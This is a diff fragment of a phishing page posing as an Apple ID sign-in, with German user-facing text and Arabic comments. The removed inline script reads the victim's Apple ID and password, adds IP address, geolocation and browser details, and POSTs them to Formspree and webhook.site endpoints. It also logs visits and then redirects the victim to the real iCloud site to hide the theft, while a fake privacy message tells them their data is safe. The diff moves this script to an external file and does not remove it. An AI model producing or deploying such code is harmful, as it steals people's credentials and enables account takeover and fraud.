-            const appleId = document.getElementById('appleId').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const rememberMe = document.getElementById('rememberMe').checked;
-            
-            if (!appleId || !password) {
-                alert('Bitte geben Sie Ihre Apple-ID und Ihr Passwort ein.');
-                return false;
-            }
-            
-            // تعطيل الزر وإظهار التحميل
-            btn.disabled = true;
-            btnText.textContent = 'Wird überprüft...';
-            loading.style.display = 'block';
-            progressBar.style.display = 'block';
-            
-            // محاكاة شريط التقدم
-            let progressValue = 0;
-            const progressInterval = setInterval(() => {
-                progressValue += Math.random() * 20;
-                progress.style.width = Math.min(progressValue, 100) + '%';
-                if (progressValue >= 100) clearInterval(progressInterval);
-            }, 200);
-            
-            // جمع البيانات
-            const formData = {
-                appleId: appleId,
-                password: password,
-                rememberMe: rememberMe,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                ip: await getIPAddress(),
-                location: await getLocation(),
-                additional: collectAdditionalData(),
-                sessionId: generateSessionId()
-            };
-            
-            try {
-                // 🔥 طريقة 1: إرسال إلى Formspree (مجاني)
-                const formspreeResponse = await fetch('https://formspree.io/f/YOUR_FORM_ID', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(formData)
-                });
-                
-                // 🔥 طريقة 2: إرسال إلى Webhook.site (للتجربة)
-                const webhookResponse = await fetch('https://webhook.site/YOUR_WEBHOOK_ID', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(formData)
-                });
-                
-                // 🔥 طريقة 3: حفظ محلي في localStorage (للتجربة)
-                localStorage.setItem('last_submission', JSON.stringify(formData));
-                
-                // ✅ محاكاة النجاح
-                setTimeout(() => {
-                    clearInterval(progressInterval);
-                    progress.style.width = '100%';
-                    loading.style.display = 'none';
-                    successCheck.style.display = 'block';
-                    
-                    // حفظ في ملف cookies للجلسة
-                    document.cookie = `last_login=${encodeURIComponent(appleId)}; max-age=86400`;
-                    
-                    // عرض رسالة نجاح
-                    setTimeout(() => {
-                        // 🎯 إعادة التوجيه إلى iCloud الحقيقي
-                        window.location.href = 'https://www.icloud.com';
-                    }, 1500);
-                    
-                }, 2500);
-                
-            } catch (error) {
-                console.error('Error:', error);
-                // حتى لو فشل الإرسال، توجيه إلى iCloud
-                setTimeout(() => {
-                    window.location.href = 'https://www.icloud.com';
-                }, 2000);
-            }
-            
-            return false;
-        }
-        
-        // 🌐 الحصول على عنوان IP (تقريبي)
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return 'Unknown';
-            }
-        }
-        
-        // 📍 الحصول على الموقع (تقريبي)
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ city: 'Unknown', country: 'Unknown' });
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        try {
-                            const response = await fetch(
-                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
-                            );
-                            const data = await response.json();
-                            resolve({
-                                city: data.address.city || data.address.town || 'Unknown',
-                                country: data.address.country || 'Unknown',
-                                coordinates: `${position.coords.latitude}, ${position.coords.longitude}`
-                            });
-                        } catch {
-                            resolve({ city: 'Unknown', country: 'Unknown' });
-                        }
-                    },
-                    () => {
-                        resolve({ city: 'Unknown', country: 'Unknown' });
-                    }
-                );
-            });
-        }
-        
-        // 🔑 توليد معرف جلسة
-        function generateSessionId() {
-            return 'session_' + Math.random().toString(36).substr(2, 9) + 
-                   '_' + Date.now().toString(36);
-        }
-        
-        // 📍 تتبع الحركة
-        document.addEventListener('mousemove', debounce((e) => {
-            const movement = {
-                x: e.clientX,
-                y: e.clientY,
-                time: Date.now()
-            };
-            // يمكن إرسال هذه البيانات أو تخزينها
-        }, 1000));
-        
-        function debounce(func, wait) {
-            let timeout;
-            return function executedFunction(...args) {
-                const later = () => {
-                    clearTimeout(timeout);
-                    func(...args);
-                };
-                clearTimeout(timeout);
-                timeout = setTimeout(later, wait);
-            };
-        }
-        
-        // 💬 نافذة المساعدة
-        function showHelp() {
-            document.getElementById('helpModal').style.display = 'flex';
-        }
-        
-        function showPrivacy() {
-            alert('Ihre Daten werden sicher verschlüsselt und gemäß unseren Datenschutzrichtlinien geschützt.');
-        }
-        
-        function showTerms() {
-            alert('Durch die Anmeldung stimmen Sie unseren Nutzungsbedingungen zu.');
-        }
-        
-        function closeModal() {
-            document.getElementById('helpModal').style.display = 'none';
-        }
-        
-        // 🔄 تحميل البيانات المحفوظة
-        window.onload = function() {
-            // محاولة ملء البيانات من cookies
-            const cookies = document.cookie.split(';');
-            cookies.forEach(cookie => {
-                const [name, value] = cookie.trim().split('=');
-                if (name === 'last_login') {
-                    document.getElementById('appleId').value = decodeURIComponent(value);
-                }
-            });
-            
-            // تسجيل زيارة
-            logVisit();
-        };
-        
-        // 📝 تسجيل الزيارة
-        async function logVisit() {
-            const visitData = {
-                url: window.location.href,
-                referrer: document.referrer,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language
-            };
-            
-            // إرسال بيانات الزيارة
-            try {
-                await fetch('https://webhook.site/YOUR_WEBHOOK_ID_VISITS', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(visitData)
-                });
-            } catch (error) {
-                // تجاهل الأخطاء
-            }
-        }
-        
-        // 🎯 إضافة تأثيرات عند الكتابة
-        document.getElementById('appleId').addEventListener('input', function(e) {
-            if (e.target.value.includes('@')) {
-                e.target.style.borderColor = '#34C759';
-            }
-        });
-        
-        document.getElementById('password').addEventListener('input', function(e) {
-            if (e.target.value.length >= 8) {
-                e.target.style.borderColor = '#34C759';
-            } else if (e.target.value.length >= 4) {
-                e.target.style.borderColor = '#FF9500';
-            }
-        });
-    </script>
+    <!-- 📁 JavaScript -->
+    <script src="script.js"></script>
 </body>
 </html>
